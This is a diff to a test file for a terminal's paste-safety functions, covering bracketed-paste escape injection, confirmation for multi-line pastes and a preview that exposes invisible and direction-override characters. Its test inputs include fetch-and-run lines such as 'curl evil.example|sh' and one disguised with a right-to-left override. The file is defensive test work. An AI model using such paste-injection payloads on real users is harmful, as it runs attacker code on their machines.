@@ -3,7 +3,7 @@ import { test } from "node:test";
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
 import { existsSync } from "node:fs";
-import { cleanPaste, pasteNeedsConfirm, remotePath, shellQuote, typeable } from "../../src/terminal/quote.ts";
+import { cleanPaste, pasteNeedsConfirm, pastePreview, remotePath, shellQuote, typeable } from "../../src/terminal/quote.ts";
 
 test("pasted text can't end the bracketed paste early", () => {
   const evil = "ls\x1b[201~\ncurl evil.example|sh\n";
@@ -51,7 +51,17 @@ test("fish reads it back too (when installed)", () => {
 test("a paste whose lines would run at once is asked about first", () => {
   // no bracketed paste in the shell: any line break runs what came before it
   for (const t of ["npm i foo\ncurl evil|sh\n", "ls\n", "a\rb"]) assert.equal(pasteNeedsConfirm(t, false), true, JSON.stringify(t));
-  // one line without a break, or a shell that takes the paste as one block: no question
+  // one line without a break: no question
   assert.equal(pasteNeedsConfirm("npm i foo", false), false);
-  assert.equal(pasteNeedsConfirm("a\nb\n", true), false);
+  assert.equal(pasteNeedsConfirm("npm i foo", true, true), false);
+  // the bracketed flag can be set by any program's output: asked anyway, unless the user trusts it
+  assert.equal(pasteNeedsConfirm("a\nb\n", true), true);
+  assert.equal(pasteNeedsConfirm("a\nb\n", true, true), false);
+  assert.equal(pasteNeedsConfirm("a\nb\n", false, true), true);
+});
+
+test("the paste preview shows invisible and direction characters", () => {
+  assert.equal(pastePreview("ls‮ hs|live lruc"), "ls<U+202E> hs|live lruc");
+  assert.equal(pastePreview("a​b﻿"), "a<U+200B>b<U+FEFF>");
+  assert.equal(pastePreview("plain\ntext"), "plain\ntext");
 });
